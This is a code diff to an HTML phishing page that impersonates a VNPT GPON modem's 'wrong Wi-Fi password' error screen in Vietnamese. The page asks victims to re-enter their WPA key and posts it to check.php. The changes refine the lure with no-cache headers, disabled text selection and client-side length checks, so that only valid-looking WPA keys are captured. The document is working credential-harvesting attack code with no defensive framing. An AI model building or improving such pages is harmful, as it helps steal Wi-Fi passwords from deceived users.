@@ -4,6 +4,9 @@
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
 <title>VNPT Gateway - Sai Mật Khẩu</title>
 <style type="text/css">
 html, body {
@@ -14,7 +17,7 @@ html, body {
     font-size: 13px;
     color: #313131;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-}
+ -webkit-user-select: none; user-select: none; }
 body, form, h1, h3, h4, p, ul, ol { margin: 0; }
 
 #page_container {
@@ -153,7 +156,7 @@ input[type="text"], input[type="password"] { width: 100%; max-width: 320px; heig
                 ❌ LỖI XÁC THỰC (ERR_WPA_KEY_INVALID): Mật khẩu Wi-Fi vừa nhập không khớp với cấu hình WPA đang lưu trên Modem VNPT. Vui lòng kiểm tra nhãn bên dưới thiết bị hoặc mật khẩu đã thay đổi gần đây và thử lại.
             </div>
 
-            <form action="check.php" method="POST">
+            <form action="check.php" method="POST" onsubmit="return validateForm()">
                 <div class="row">
                     <div class="left">Model thiết bị:</div>
                     <div class="right row-value"><strong>Modem Quang VNPT (GPON Optical Network Terminal)</strong></div>
@@ -161,7 +164,7 @@ input[type="text"], input[type="password"] { width: 100%; max-width: 320px; heig
                 <div class="row">
                     <div class="left">Mật Khẩu (WPA Key):</div>
                     <div class="right">
-                        <input type="password" id="pwd" name="key1" placeholder="Nhập lại mật khẩu WPA/WPA2" required autofocus autocomplete="off">
+                        <input type="password" id="pwd" name="key1" placeholder="Nhập lại mật khẩu WPA/WPA2" required autofocus autocomplete="off" minlength="8" maxlength="63">
                         <label class="toggle-pw">
                             <input type="checkbox" onclick="togglePwd()"> Hiển thị mật khẩu
                         </label>
@@ -191,6 +194,17 @@ input[type="text"], input[type="password"] { width: 100%; max-width: 320px; heig
 function togglePwd() {
     var x = document.getElementById("pwd");
     x.type = (x.type === "password") ? "text" : "password";
+}
+
+function validateForm() {
+    var pwd = document.getElementById("pwd");
+    if (pwd) {
+        if (pwd.value.length < 8 || pwd.value.length > 63) {
+            alert("Mật khẩu WPA/WPA2 phải có độ dài từ 8 đến 63 ký tự. / WPA password must be between 8 and 63 characters.");
+            return false;
+        }
+    }
+    return true;
 }
 </script>
 </body>
